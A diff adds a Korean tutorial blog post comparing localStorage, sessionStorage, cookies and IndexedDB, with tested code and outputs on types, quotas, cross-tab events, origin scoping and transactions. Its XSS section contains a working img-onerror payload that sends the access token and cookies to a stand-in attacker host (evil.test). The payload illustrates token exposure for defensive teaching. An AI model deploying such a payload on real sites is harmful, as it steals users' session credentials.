@@ -1,0 +1,614 @@
+import { getPostMetadata } from "@/features/posts";
+
+export const metadata = getPostMetadata("browser-storage");
+
+설정 화면에 "알림 끄기" 토글을 만들고 값을 `localStorage`에 넣었다. 끄고 새로고침했더니 알림이 다시 켜져 있다. 저장하는 코드도, 읽는 코드도 한 줄씩이다.
+
+```js
+localStorage.setItem("count", 1);
+localStorage.setItem("user", { id: 1 });
+localStorage.setItem("flag", false);
+
+console.log(typeof localStorage.getItem("count"), JSON.stringify(localStorage.getItem("count")));
+console.log(localStorage.getItem("user"));
+console.log(localStorage.getItem("flag") ? "flag is truthy" : "flag is falsy");
+console.log(localStorage.getItem("missing"));
+```
+
+Playwright로 띄운 Chromium 141에서 돌린 결과다.
+
+```text
+string "1"
+[object Object]
+flag is truthy
+null
+```
+
+`false`를 넣었는데 꺼낸 값은 문자열 `"false"`이고, 빈 문자열이 아닌 문자열은 참이다. 객체는 `"[object Object]"`라는 글자로 바뀌어 원래 내용이 사라졌다. 브라우저 저장소는 쓰기 쉬운 만큼 이런 함정이 많다.
+
+이 글은 브라우저가 주는 저장소 네 가지(localStorage, sessionStorage, 쿠키, IndexedDB)를 실제로 돌려 보며 비교한다. 무엇이 들어가는지, 쓰는 동안 화면이 멈추는지, 다른 탭과 어떻게 이어지는지, 어디까지가 같은 칸인지, XSS 앞에서 무엇이 털리는지를 본다. 출력은 모두 Chromium 141(헤드리스)과 로컬 Node 서버에서 실제로 돌린 결과다.
+
+먼저 읽으면 좋은 글: 저장 공간 한도와 브라우저가 데이터를 지우는 순서는 [프런트엔드 캐시](/posts/frontend-browser-cache)에서, 쿠키로 로그인을 유지하는 흐름은 [쿠키와 세션 로그인](/posts/cookie-session-login)에서, 토큰을 어디에 둘지는 [토큰 로그인](/posts/token-login)에서 다뤘다. 여기서는 그 설명을 반복하지 않고 저장소 자체의 동작에 집중한다.
+
+## 문자열만 받는 상자
+
+`localStorage`와 `sessionStorage`는 Web Storage라는 같은 API다. 키도 값도 문자열이다. 문자열이 아닌 값을 넣으면 브라우저가 `String(value)`로 바꿔서 저장한다. `1`은 `"1"`, `false`는 `"false"`, 객체는 `"[object Object]"`가 된다. 없는 키를 읽으면 `null`이다.
+
+그래서 보통 `JSON.stringify`로 넣고 `JSON.parse`로 꺼낸다. 이 방식에도 구멍이 있다.
+
+```js
+console.log(JSON.parse(localStorage.getItem("missing")));   // 없는 키
+
+localStorage.setItem("u2", undefined);                       // 실수로 undefined를 넣었다
+console.log(JSON.stringify(localStorage.getItem("u2")));
+try { JSON.parse(localStorage.getItem("u2")); } catch (e) { console.log(e.name + ": " + e.message); }
+
+localStorage.setItem("d", JSON.stringify({ at: new Date(0), tags: new Set(["a"]) }));
+console.log(localStorage.getItem("d"));
+```
+
+```text
+null
+"undefined"
+SyntaxError: "undefined" is not valid JSON
+{"at":"1970-01-01T00:00:00.000Z","tags":{}}
+```
+
+`JSON.parse(null)`은 `null`을 돌려줘서 없는 키는 조용히 넘어간다. 반면 `undefined`를 넣으면 문자열 `"undefined"`가 저장되고, 그걸 `JSON.parse`하면 예외가 난다. 이 예외를 잡지 않으면 앱이 첫 화면에서 죽는다. 한 번 잘못 저장된 값은 사용자 브라우저에 계속 남아 있으니, 배포로 코드를 고쳐도 그 사용자는 계속 깨진 화면을 본다.
+
+`Date`는 문자열로 바뀌고 `Set`과 `Map`은 빈 객체 `{}`가 된다. 꺼낼 때 다시 `new Date(...)`로 되살려야 한다. 이런 값을 그대로 넣고 싶으면 IndexedDB를 쓴다. 뒤에서 본다.
+
+## 저장소 네 가지의 자리
+
+네 저장소는 "누가 열쇠를 쥐고 있나"가 다르다. Web Storage와 IndexedDB는 출처(origin) 하나에 칸이 하나씩 있고 자바스크립트만 읽는다. 쿠키는 브라우저가 들고 있다가 요청마다 서버에 붙여 보낸다. 아래 그림은 이 관계를 그린 것이다.
+
+<ConceptDiagram
+  caption="Web Storage와 IndexedDB는 출처별, 쿠키는 사이트 도메인별로 묶이고 서버까지 간다"
+  width={400}
+  height={250}
+  nodes={[
+    { id: "js", label: "페이지 JS", sub: "blog.test:8123", x: 200, y: 30, w: 130 },
+    { id: "ls", label: "localStorage", sub: "출처별 · 영구", x: 70, y: 115, w: 120 },
+    { id: "ss", label: "sessionStorage", sub: "출처 + 탭", x: 200, y: 115, w: 124 },
+    { id: "idb", label: "IndexedDB", sub: "출처별 · 비동기", x: 330, y: 115, w: 120 },
+    { id: "ck", label: "쿠키", sub: "도메인 + 경로", x: 110, y: 210, w: 120 },
+    { id: "srv", label: "서버", sub: "Cookie 헤더", x: 300, y: 210, w: 110 },
+  ]}
+  edges={[
+    { from: "js", to: "ls", label: "동기" },
+    { from: "js", to: "ss", label: "동기" },
+    { from: "js", to: "idb", label: "비동기" },
+    { from: "js", to: "ck", label: "document.cookie", dashed: true },
+    { from: "ck", to: "srv", label: "요청마다" },
+    { from: "srv", to: "ck", label: "Set-Cookie", dashed: true },
+  ]}
+/>
+
+이 차이가 고르는 기준이 된다. 정말 비교가 필요한 대목이라 표로 둔다.
+
+| | localStorage | sessionStorage | 쿠키 | IndexedDB |
+|---|---|---|---|---|
+| 수명 | 지울 때까지 | 탭을 닫을 때까지 | `Expires`·`Max-Age`까지, 없으면 브라우저 세션 | 지울 때까지 |
+| 묶이는 범위 | 출처 | 출처 + 탭 | 도메인 + 경로 (포트 무관) | 출처 |
+| API | 동기 | 동기 | `document.cookie` 문자열 | 비동기, 트랜잭션 |
+| 값 | 문자열 | 문자열 | 문자열 | 구조화된 값, `Blob` |
+| 크기 | 출처당 약 5M 글자 | 출처당 약 5M 글자 | 쿠키 하나 약 4KB | 디스크 비율 |
+| 서버로 가나 | 아니다 | 아니다 | 요청마다 간다 | 아니다 |
+| 워커에서 | 못 쓴다 | 못 쓴다 | 못 쓴다 (Cookie Store API 제외) | 쓴다 |
+
+쿠키만 서버로 간다는 점이 가장 큰 차이다. 서버가 알아야 하는 값(세션 ID)은 쿠키, 브라우저만 알면 되는 값은 나머지 셋 중에서 고른다. 화면 설정 몇 개를 쿠키에 넣으면 이미지 요청 하나하나에도 그 쿠키가 붙어 나간다.
+
+## 쓰는 동안 화면이 멈춘다
+
+Web Storage의 API는 동기다. `setItem`이 돌아오기 전까지 다음 줄로 가지 않는다. 메인 스레드는 하나뿐이라 그동안 클릭도, 스크롤 처리도, 그리기도 멈춘다. 작은 값이면 티가 안 나지만, 목록 데이터를 통째로 캐시하면 이야기가 다르다.
+
+글 2만 개짜리 배열(약 4MB)을 넣고, 새로고침한 뒤 다시 꺼내 봤다.
+
+```js
+const items = Array.from({ length: 20000 }, (_, i) => ({ id: i, title: "post " + i, body: "x".repeat(150), tags: ["js", "web"] }));
+let t = performance.now();
+const s = JSON.stringify(items);
+const tStr = performance.now() - t;
+t = performance.now();
+localStorage.setItem("cache", s);
+const tSet = performance.now() - t;
+console.log(`value ${(s.length / 1024 / 1024).toFixed(2)}M chars, stringify ${tStr.toFixed(1)}ms, setItem ${tSet.toFixed(1)}ms`);
+// 새로고침 뒤
+const raw = localStorage.getItem("cache");
+const v = JSON.parse(raw);
+```
+
+세 번 돌린 결과 중 하나다.
+
+```text
+value 4.06M chars, stringify 34.0ms, setItem 20.6ms
+after reload: first getItem 0.8ms, second 0.0ms, JSON.parse 18.2ms, items 20000
+```
+
+세 번 모두 `JSON.stringify`가 29~38ms, `setItem`이 20~38ms, `JSON.parse`가 12~28ms 걸렸다. 쓰기 한 번에 50ms 넘게 메인 스레드를 잡는다. 브라우저가 "긴 작업"으로 치는 기준이 50ms다. 데이터가 바뀔 때마다 이렇게 저장하면 입력할 때마다 버벅인다. 개발용 PC가 이 정도면 저가 휴대폰에서는 몇 배가 걸린다.
+
+아래 그림은 사용자가 체크박스를 누른 순간 메인 스레드에서 일어나는 일이다.
+
+<AlgoTrace
+  caption="저장이 끝날 때까지 다음 프레임을 그리지 못한다"
+  memoryLabel="메인 스레드가 하는 일"
+  cells={["클릭", "상태 변경", "stringify", "setItem", "그리기"]}
+  steps={[
+    { caption: "사용자가 체크박스를 누른다. 클릭 핸들러가 시작된다." },
+    { pointer: 0, memory: ["클릭 핸들러"], caption: "핸들러가 메인 스레드를 잡는다." },
+    { pointer: 1, memory: ["클릭 핸들러", "상태 갱신"], caption: "목록 상태를 바꾼다. 여기까지는 1ms도 안 걸린다." },
+    { pointer: 2, memory: ["클릭 핸들러", "상태 갱신", "stringify 34ms"], caption: "저장하려고 2만 개를 문자열로 바꾼다. 34ms." },
+    { pointer: 3, memory: ["클릭 핸들러", "상태 갱신", "stringify 34ms", "setItem 21ms"], caption: "setItem이 4MB를 디스크 쪽으로 넘긴다. 동기라서 끝날 때까지 기다린다." },
+    { pointer: 4, found: [4], memory: ["그리기"], caption: "55ms가 지나서야 체크 표시가 그려진다. 사용자는 누른 뒤 한참 있다 반응을 본다." },
+  ]}
+/>
+
+해결은 두 갈래다. 저장 빈도를 줄이거나(입력이 멈춘 뒤 한 번 저장하는 [디바운스](/posts/debounce-throttle)), 큰 데이터를 비동기 저장소인 IndexedDB로 옮긴다. IndexedDB도 값을 복제하는 비용은 메인 스레드에서 들지만, 디스크에 쓰는 일은 기다리지 않는다. `JSON.stringify`를 미리 할 필요도 없다.
+
+## 5MB는 바이트가 아니라 글자 수다
+
+용량이 꽉 차면 어떻게 되는지도 봤다. 값 하나를 0.5M 글자씩 키우며 넣다가 실패한 지점, 그리고 키 `k`에 넣을 수 있는 최대 길이를 이분 탐색으로 찾았다.
+
+```js
+const MB = 1024 * 1024;
+let n = 0;
+try {
+  for (n = 1; n <= 12; n++) localStorage.setItem("big", "a".repeat(n * MB / 2));
+} catch (e) { console.log(`failed at ${n / 2}MB chars:`, e.name, e.message); }
+console.log("stored length", localStorage.getItem("big").length);
+```
+
+```text
+failed at 5MB chars: QuotaExceededError Failed to execute 'setItem' on 'Storage': Setting the value of 'big' exceeded the quota.
+stored length 4718592
+korean failed at 5M chars
+max value chars with key 'k': 5242879 = 5 Mi chars incl key
+```
+
+Chromium 141에서 한도는 키와 값을 합쳐 5,242,880 글자(5Mi)였다. `"가"`로 채워도 같은 지점에서 실패했다. 바이트가 아니라 UTF-16 글자 단위로 센다는 뜻이다. 실패한 `setItem`은 아무것도 바꾸지 않아서, 직전에 넣은 4.5M 글자 값이 그대로 남았다. 파이어폭스와 사파리도 출처당 5MB 안팎이지만 세는 방식은 브라우저마다 다를 수 있다.
+
+실무에서는 이 에러를 잡지 않아 앱이 죽는 경우가 많다. 저장은 "되면 좋은 일"로 다루고 실패해도 화면은 계속 돌게 감싼다.
+
+```js
+function safeSet(key, value) {
+  try {
+    localStorage.setItem(key, value);
+    return true;
+  } catch (e) {
+    // QuotaExceededError, 또는 저장소 접근이 막힌 환경의 SecurityError
+    reportOnce(e.name);
+    return false;
+  }
+}
+```
+
+`setItem`만 실패하는 게 아니다. 사용자가 브라우저 설정에서 사이트 데이터를 막으면 크롬 계열은 `window.localStorage`에 접근하는 순간 `SecurityError`를 던진다. 예전 사파리(대략 iOS 10까지)의 사생활 보호 모드는 한도가 0이라 `setItem`이 늘 실패했다. 그래서 읽기도 `try`로 감싸고, 실패하면 기본값으로 화면을 그린다.
+
+IndexedDB의 한도와 기기 디스크가 모자랄 때 출처를 통째로 지우는 규칙은 [프런트엔드 캐시 글의 용량 부분](/posts/frontend-browser-cache)에 있다. 하나만 덧붙이면, 그 글에서 쓴 `navigator.storage.estimate()`는 보안 출처(HTTPS나 localhost)에서만 있다. 이번 실험처럼 `http://blog.test`로 띄우면 `navigator.storage`가 `undefined`라서 `TypeError`가 났다.
+
+## 다른 탭이 바꾼 값을 듣는 storage 이벤트
+
+같은 사이트를 탭 두 개로 열어 두고 한쪽에서 로그아웃했다. 다른 탭은 여전히 로그인된 화면이다. 이럴 때 쓰는 게 `storage` 이벤트다. 한 탭이 `localStorage`를 바꾸면 같은 출처의 다른 탭들에 이벤트가 간다.
+
+탭 A에서 값을 바꾸고 탭 B에서 이벤트를 받아 봤다.
+
+```js
+// 탭 B
+window.addEventListener("storage", e =>
+  console.log(`storage key=${e.key} old=${e.oldValue} new=${e.newValue} url=${e.url}`));
+
+// 탭 A에서 차례로
+localStorage.setItem("theme", "dark");
+localStorage.setItem("theme", "dark");     // 같은 값을 한 번 더
+localStorage.removeItem("theme");
+localStorage.setItem("x", "1");
+localStorage.clear();
+```
+
+탭 B가 받은 이벤트만 모았다.
+
+```text
+storage key=theme old=null new=dark url=http://blog.test:8123/
+storage key=theme old=dark new=null url=http://blog.test:8123/
+storage key=x old=null new=1 url=http://blog.test:8123/
+storage key=null old=null new=null url=http://blog.test:8123/
+```
+
+탭 A 자신에게는 이벤트가 하나도 오지 않았다. 같은 값을 다시 넣은 두 번째 `setItem`은 바뀐 게 없어서 이벤트가 없다. `removeItem`은 `newValue`가 `null`, `clear()`는 `key`까지 `null`이다. 핸들러에서 `e.key === "token"`만 보면 `clear()`로 로그아웃한 경우를 놓친다.
+
+아래 그림에서 다음을 누르면 탭 사이로 이벤트가 어떻게 가는지 따라간다.
+
+<SequenceDiagram
+  caption="바꾼 탭은 이벤트를 받지 않는다. 같은 출처의 다른 탭만 받는다"
+  actors={[
+    { id: "a", label: "탭 A" },
+    { id: "store", label: "localStorage" },
+    { id: "b", label: "탭 B" },
+  ]}
+  steps={[
+    { from: "a", to: "store", label: "removeItem", title: "탭 A에서 로그아웃한다", detail: "토큰을 지운다. 탭 A는 직접 화면을 로그인 전으로 바꾼다." },
+    { from: "store", to: "a", label: "이벤트 없음", title: "바꾼 탭에는 오지 않는다", detail: "storage 이벤트는 다른 문서에 알리려는 장치다. 같은 탭의 다른 컴포넌트도 받지 못한다." },
+    { from: "store", to: "b", label: "storage", title: "탭 B가 이벤트를 받는다", detail: "key는 token, oldValue는 옛 토큰, newValue는 null이다.", payload: "{ key: \"token\", oldValue: \"eyJ…\", newValue: null }" },
+    { from: "b", to: "b", label: "로그인 화면으로", title: "탭 B도 따라 로그아웃한다", detail: "newValue가 null이거나 key가 null(clear)이면 로그아웃으로 본다." },
+  ]}
+/>
+
+탭 사이에 값이 아니라 메시지를 보내고 싶으면 `BroadcastChannel`이 더 맞다. 저장소를 메시지 통로로 쓰면 메시지를 보낼 때마다 디스크에 쓰고, 같은 내용을 두 번 보내면 두 번째는 이벤트가 안 간다.
+
+```js
+const ch = new BroadcastChannel("auth");
+ch.postMessage({ type: "logout" });          // 보내는 탭
+ch.onmessage = (e) => { if (e.data.type === "logout") goLogin(); };  // 받는 탭들
+```
+
+## sessionStorage는 탭마다 따로 산다
+
+`sessionStorage`는 같은 API에 수명과 범위만 다르다. 탭 A에서 값을 넣고 다른 탭에서 읽고, 새로고침하고, 탭 A에서 `window.open`으로 새 탭을 열어 봤다.
+
+```js
+// 탭 A
+sessionStorage.setItem("draft", "hello");
+// 탭 B (같은 주소를 따로 연 탭)
+sessionStorage.getItem("draft");
+// 탭 A 새로고침 후, window.open으로 연 탭 C, noopener로 연 탭 D에서 각각 읽는다
+```
+
+```text
+[tab A] A session draft = hello
+[tab B] B session draft = null
+[tab A] A after reload session draft = hello
+[tab C opened by A] hello
+[tab A after C changed] hello
+[tab D opened noopener] null
+```
+
+같은 출처라도 탭 B는 따로 연 탭이라 빈 칸이다. 새로고침에는 살아남는다. `window.open`으로 연 탭 C는 여는 순간 탭 A의 값을 복사해 받지만, 그 뒤로는 따로 간다. C에서 바꿔도 A는 그대로다. `noopener`로 열면 복사도 없다.
+
+그래서 "새 탭으로 열면 작성 중인 글이 사라진다"는 sessionStorage에서는 정상 동작이다. 로그인 토큰을 sessionStorage에 두면 사용자가 링크를 새 탭으로 열 때마다 다시 로그인해야 한다.
+
+## 출처마다 칸이 나뉘고 쿠키는 다르게 나뉜다
+
+Web Storage와 IndexedDB는 출처 단위로 나뉜다. 출처는 스킴, 호스트, 포트 세 가지가 모두 같아야 같다. 쿠키는 기준이 다르다. 도메인과 경로로 묶이고 포트는 보지 않는다.
+
+`http://blog.test:8123`에서 `localStorage`에 토큰을 넣고, 서버가 쿠키 세 개를 내려 주게 했다. `sid`는 `HttpOnly`, `theme`은 도메인을 지정하지 않은 보통 쿠키, `shared`는 `Domain=blog.test`를 붙인 쿠키다. 그리고 세 출처에서 각각 읽었다.
+
+```text
+http://blog.test:8123      localStorage.token=abc | document.cookie="theme=dark; shared=yes" | sent Cookie: "sid=s3cr3t-session; theme=dark; shared=yes"
+http://sub.blog.test:8123  localStorage.token=null | document.cookie="shared=yes" | sent Cookie: "shared=yes"
+http://blog.test:8124      localStorage.token=null | document.cookie="theme=dark; shared=yes" | sent Cookie: "sid=s3cr3t-session; theme=dark; shared=yes"
+```
+
+포트만 다른 `blog.test:8124`는 `localStorage`가 비어 있지만 쿠키는 셋 다 받았다. 서브도메인 `sub.blog.test`는 `Domain`을 지정한 `shared`만 받는다. `HttpOnly`인 `sid`는 어디서도 `document.cookie`에 안 보이지만 요청에는 실려 간다.
+
+아래 그림은 같은 내용을 출처 단위로 그린 것이다. 다음을 누르면 각 출처가 무엇에 닿고 무엇에서 막히는지 보인다.
+
+<NetworkTopology
+  width={400}
+  height={270}
+  caption="localStorage는 출처가 하나라도 다르면 막히고, 쿠키는 도메인 규칙을 따른다"
+  zones={[
+    { id: "site", label: "blog.test", x: 10, y: 10, w: 380, h: 250, tone: "private" },
+  ]}
+  nodes={[
+    { id: "ls", label: "localStorage", sub: "blog.test:8123", x: 105, y: 70, icon: "db", w: 118 },
+    { id: "ck", label: "쿠키 저장소", sub: "blog.test", x: 295, y: 70, icon: "lock", w: 112 },
+    { id: "o1", label: "blog.test", sub: ":8123", x: 70, y: 210, icon: "client", w: 100 },
+    { id: "o2", label: "sub.blog", sub: ":8123", x: 200, y: 210, icon: "client", w: 100 },
+    { id: "o3", label: "blog.test", sub: ":8124", x: 330, y: 210, icon: "client", w: 100 },
+  ]}
+  links={[
+    { from: "o1", to: "ls" },
+    { from: "o2", to: "ls", dashed: true },
+    { from: "o3", to: "ls", dashed: true },
+    { from: "o1", to: "ck" },
+    { from: "o2", to: "ck", dashed: true },
+    { from: "o3", to: "ck" },
+  ]}
+  steps={[
+    { path: ["o1", "ls"], packet: "token=abc", title: "토큰을 넣은 출처", detail: "스킴, 호스트, 포트가 모두 같으니 자기 칸을 그대로 읽는다." },
+    { path: ["o3", "ls"], packet: "getItem", blocked: true, title: "포트만 달라도 다른 칸", detail: "blog.test:8124는 다른 출처다. localStorage는 비어 있다." },
+    { path: ["o2", "ls"], packet: "getItem", blocked: true, title: "서브도메인도 다른 칸", detail: "sub.blog.test는 호스트가 다르다. Web Storage에는 도메인을 넓히는 옵션이 없다." },
+    { path: ["o3", "ck"], packet: "Cookie", title: "쿠키는 포트를 보지 않는다", detail: "포트가 달라도 같은 호스트라 sid, theme, shared가 모두 실려 간다." },
+    { path: ["o2", "ck"], packet: "shared=yes", title: "Domain을 붙인 쿠키만 서브도메인에", detail: "Domain=blog.test를 지정한 shared만 sub.blog.test 요청에 붙는다." },
+  ]}
+/>
+
+이 차이가 실무에서 문제로 드러나는 모습은 이렇다. `www.example.com`에서 `example.com`으로 주소를 옮겼더니 다크 모드 설정과 장바구니가 사라졌다. localStorage는 옛 출처에 그대로 있다. 옮기려면 옛 출처 페이지에서 값을 읽어 서버나 새 출처로 넘기는 과정을 따로 만들어야 한다. 반대로 개발 서버를 `localhost:3000`과 `localhost:3001`로 띄우면 localStorage는 따로지만 쿠키는 섞인다. 두 앱의 세션 쿠키 이름이 같으면 서로 덮어쓴다.
+
+다른 사이트의 iframe 안에서는 또 다르다. 크롬은 115부터 서드파티 iframe의 저장소를 최상위 사이트별로 나눈다(storage partitioning). `a.com`에 박힌 위젯과 `b.com`에 박힌 같은 위젯은 서로 다른 localStorage를 본다. 위젯이 "어느 사이트에서든 같은 사용자"를 알아보던 방식은 이제 통하지 않는다. 이번 Playwright 환경에서는 이 분리가 재현되지 않아 출력은 싣지 않는다.
+
+## 쿠키는 저장소이면서 요청 헤더다
+
+쿠키는 저장소로 쓰기에는 제약이 많다. 이름과 값을 합쳐 약 4KB가 한도다. 넘기면 에러 없이 무시된다.
+
+```js
+document.cookie = "big=" + "a".repeat(4100) + "; Path=/";
+console.log("4100-byte cookie stored? " + document.cookie.includes("big="));
+document.cookie = "mid=" + "a".repeat(4000) + "; Path=/";
+console.log("4000-byte cookie stored? " + document.cookie.includes("mid="));
+document.cookie = "sid=overwritten; Path=/";
+console.log("after trying to overwrite sid from JS: " + document.cookie);
+```
+
+```text
+4100-byte cookie stored? false
+4000-byte cookie stored? true
+after trying to overwrite sid from JS: theme=dark; shared=yes
+sent after overwrite attempt: sid=s3cr3t-session; theme=dark; shared=yes
+```
+
+4100바이트짜리는 조용히 버려졌다. `HttpOnly`인 `sid`를 자바스크립트로 덮어쓰려던 시도도 무시됐다. 크롬은 스크립트가 같은 이름의 `HttpOnly` 쿠키를 덮지 못하게 막는다.
+
+더 큰 비용은 크기보다 횟수다. 쿠키는 그 도메인으로 가는 모든 요청에 붙는다. HTTP/1.1이라면 4KB 쿠키 하나가 이미지 50개짜리 페이지에서 200KB를 위로 올려 보낸다. HTTP/2와 HTTP/3은 헤더 압축으로 같은 쿠키의 반복을 줄여 주지만, 서버가 받는 헤더 크기 자체는 줄지 않는다. 서버 쪽 헤더 한도(Nginx 기본 버퍼 등)를 넘겨 `400 Request Header Or Cookie Too Large`를 받는 일도 생긴다. 정적 파일을 쿠키 없는 별도 도메인에서 내려 주는 이유가 이것이다.
+
+`SameSite`, `Secure`, `Domain` 같은 속성을 하나씩 뜯어보는 건 [CSRF 글](/posts/csrf)에서 했다.
+
+## XSS 하나면 localStorage는 통째로 읽힌다
+
+여기가 저장소를 고를 때 가장 중요한 대목이다. 같은 출처에서 도는 자바스크립트는 그 출처의 localStorage를 전부 읽을 수 있다. 내 코드든, 공격자가 끼워 넣은 코드든 구분하지 않는다.
+
+댓글을 `innerHTML`로 넣는 버그가 있는 페이지를 만들고, 토큰을 localStorage에 둔 상태에서 공격용 댓글을 넣어 봤다.
+
+```html
+<img src=x onerror="navigator.sendBeacon('http://evil.test:8124/steal',
+  JSON.stringify({ ls: localStorage.getItem('accessToken'), cookie: document.cookie }));
+  fetch('/echo-cookie').then(r => r.json()).then(j => console.log('script used session anyway, server saw:', j.cookie))">
+```
+
+공격자 서버의 로그와 페이지 콘솔이다.
+
+```text
+[attacker server] POST /steal body={"ls":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.sig","cookie":"theme=dark; shared=yes"}
+[page] script used session anyway, server saw: sid=s3cr3t-session; theme=dark; shared=yes
+```
+
+<SequenceDiagram
+  caption="같은 출처에서 도는 스크립트는 localStorage를 고르지 않고 읽는다"
+  actors={[
+    { id: "att", label: "공격자" },
+    { id: "page", label: "피해자 탭" },
+    { id: "app", label: "blog.test" },
+    { id: "evil", label: "evil.test" },
+  ]}
+  steps={[
+    { from: "att", to: "app", label: "댓글 등록", title: "공격용 댓글을 남긴다", detail: "img 태그의 onerror에 스크립트를 담는다." },
+    { from: "app", to: "page", label: "innerHTML", title: "피해자가 글을 연다", detail: "댓글이 HTML로 들어가고 onerror가 blog.test 출처로 실행된다." },
+    { from: "page", to: "evil", label: "accessToken", title: "토큰이 밖으로 나간다", detail: "localStorage의 토큰과 HttpOnly가 아닌 쿠키가 공격자 서버로 간다. 공격자는 이 토큰을 자기 컴퓨터에서 만료될 때까지 쓴다.", payload: "{ ls: \"eyJhbGci…sig\", cookie: \"theme=dark; shared=yes\" }" },
+    { from: "page", to: "app", label: "fetch + sid", title: "HttpOnly는 읽기만 막는다", detail: "sid는 읽히지 않았지만, 스크립트가 보낸 요청에도 브라우저가 sid를 붙인다. 탭이 열려 있는 동안은 피해자 대신 요청할 수 있다." },
+  ]}
+/>
+
+결과를 비교해 보면 저장 위치의 차이가 보인다. localStorage의 토큰은 문자열 그대로 공격자 손에 넘어갔다. 공격자는 이제 자기 컴퓨터에서 그 토큰이 만료될 때까지 API를 부를 수 있다. `HttpOnly` 쿠키인 `sid`는 읽히지 않았다. 다만 마지막 줄처럼 스크립트가 보낸 요청에도 `sid`는 실려 갔다. 탭이 열려 있는 동안은 공격자 코드가 피해자 대신 요청할 수 있다는 뜻이다.
+
+그래서 `HttpOnly` 쿠키는 XSS를 막는 장치가 아니라 피해를 줄이는 장치다. 토큰이 밖으로 새지 않으니, 공격은 그 탭이 열려 있는 동안으로 줄어든다. 근본 대책은 XSS 자체를 막는 것(출력 인코딩, CSP)이고 이건 [XSS 글](/posts/xss)에서 다뤘다. 토큰을 메모리와 `HttpOnly` 쿠키에 나눠 두는 조합은 [토큰 로그인 글](/posts/token-login)에 있다.
+
+<Callout kind="warning" title="클라이언트 저장소는 비밀 금고가 아니다">
+localStorage, sessionStorage, IndexedDB는 암호화되지 않은 채 사용자 디스크에 남고, 같은 출처의 어떤 스크립트도 읽는다. 서드파티 분석 스크립트나 광고 태그도 같은 출처로 실행되면 마찬가지다. 비밀번호, 카드 번호, 오래 사는 리프레시 토큰은 여기에 두지 않는다.
+</Callout>
+
+## 크고 구조가 있는 데이터는 IndexedDB
+
+IndexedDB는 이름처럼 브라우저 안의 작은 데이터베이스다. 값을 문자열로 바꾸지 않고 구조화된 복제(structured clone)로 저장해서, `Date`, `Map`, `Set`, `Blob`이 그대로 들어간다. 키로 찾고, 인덱스를 만들 수 있고, 모든 읽기와 쓰기가 트랜잭션 안에서 일어난다.
+
+임시 글 저장소를 만들고 여러 값을 넣어 봤다.
+
+```js
+const open = indexedDB.open("blog", 1);
+open.onupgradeneeded = () => {
+  const s = open.result.createObjectStore("drafts", { keyPath: "id" });
+  s.createIndex("byUpdated", "updatedAt");
+};
+const db = await req(open);   // req는 IDBRequest를 Promise로 감싼 작은 함수
+
+const tx = db.transaction("drafts", "readwrite");
+tx.objectStore("drafts").put({
+  id: 42, title: "임시 글", updatedAt: new Date(0),
+  tags: new Set(["js"]), meta: new Map([["words", 120]]), file: new Blob(["hello"]),
+});
+await new Promise((r) => (tx.oncomplete = r));
+
+const got = await req(db.transaction("drafts").objectStore("drafts").get(42));
+console.log("get:", got.updatedAt instanceof Date, got.tags instanceof Set, got.meta.get("words"), got.file instanceof Blob, got.file.size);
+
+db.transaction("drafts", "readwrite").objectStore("drafts").put({ id: 1, fn: () => 1 });
+```
+
+```text
+get: true true 120 true 5
+DataCloneError: Failed to execute 'put' on 'IDBObjectStore': () => 1 could not be cloned.
+```
+
+`Date`는 `Date`로, `Set`은 `Set`으로 돌아온다. 함수는 복제할 수 없어서 `DataCloneError`가 난다. 클래스 인스턴스도 넣을 수는 있지만 꺼내면 프로토타입이 사라진 평범한 객체다. 복사 규칙 자체는 [얕은 복사와 깊은 복사](/posts/js-shallow-deep-copy)에서 본 `structuredClone`과 같다.
+
+### 트랜잭션은 await를 기다려 주지 않는다
+
+IndexedDB에서 가장 많이 틀리는 곳이다. 트랜잭션 안에서 다른 비동기 작업을 기다리면 트랜잭션이 끝나 버린다.
+
+```js
+const tx = db.transaction("drafts", "readwrite");
+const store = tx.objectStore("drafts");
+store.put({ id: 43, title: "a" });
+await fetch("/echo-cookie");               // 서버에 잠깐 다녀온다
+store.put({ id: 44, title: "b" });
+```
+
+```text
+after await fetch: TransactionInactiveError: Failed to execute 'put' on 'IDBObjectStore': The transaction has finished.
+```
+
+트랜잭션은 걸어 둔 요청이 다 끝나고 이벤트 루프로 돌아갔을 때 더 할 일이 없으면 스스로 커밋한다. `fetch`를 기다리는 동안 트랜잭션은 할 일이 없다고 보고 닫혔다. 아래 그림은 이 순서를 따라간다.
+
+<AlgoTrace
+  caption="트랜잭션은 할 일이 없는 틈에 스스로 닫힌다"
+  memoryLabel="트랜잭션 상태"
+  cells={["tx 시작", "put 43", "await fetch", "put 43 완료", "put 44"]}
+  steps={[
+    { caption: "readwrite 트랜잭션 하나로 두 글을 저장하려 한다." },
+    { pointer: 0, memory: ["active"], caption: "트랜잭션이 열린다. 지금은 요청을 받을 수 있다." },
+    { pointer: 1, memory: ["active", "대기: put 43"], caption: "put 43을 건다. 결과는 나중에 온다." },
+    { pointer: 2, memory: ["inactive", "대기: put 43"], caption: "fetch를 기다리며 이벤트 루프로 돌아간다. 이 순간 트랜잭션은 요청을 받지 않는다." },
+    { pointer: 3, memory: ["commit"], caption: "put 43이 끝났는데 새 요청이 없다. 할 일이 없으니 커밋하고 닫는다." },
+    { pointer: 4, memory: ["finished"], caption: "fetch가 돌아와 put 44를 걸지만 이미 끝난 트랜잭션이다. TransactionInactiveError." },
+  ]}
+/>
+
+필요한 데이터는 트랜잭션을 열기 전에 다 받아 두고, 트랜잭션 안에서는 IndexedDB 요청만 연달아 건다. `idb` 같은 래퍼를 써도 이 규칙은 그대로다.
+
+### 다른 탭이 옛 연결을 쥐고 있으면 업그레이드가 멈춘다
+
+스키마를 바꾸려면 `indexedDB.open("blog", 2)`처럼 버전을 올린다. 그런데 옛 버전 코드를 돌리는 탭이 연결을 쥐고 있으면 업그레이드가 시작되지 않는다. 탭 A가 버전 1 연결을 연 채로, 새로 배포된 탭 B가 버전 2를 열었다.
+
+두 탭의 로그를 같은 시계로 찍어 시간순으로 모았다. 탭 A는 1초 뒤에 연결을 닫게 했다.
+
+```text
+[tab A] 60ms versionchange received (not closing)
+[tab B] 61ms blocked: oldVersion=1 newVersion=2
+[tab A] 1067ms A closed its connection
+[tab B] 1072ms upgradeneeded v2
+[tab B] 1072ms opened v2
+```
+
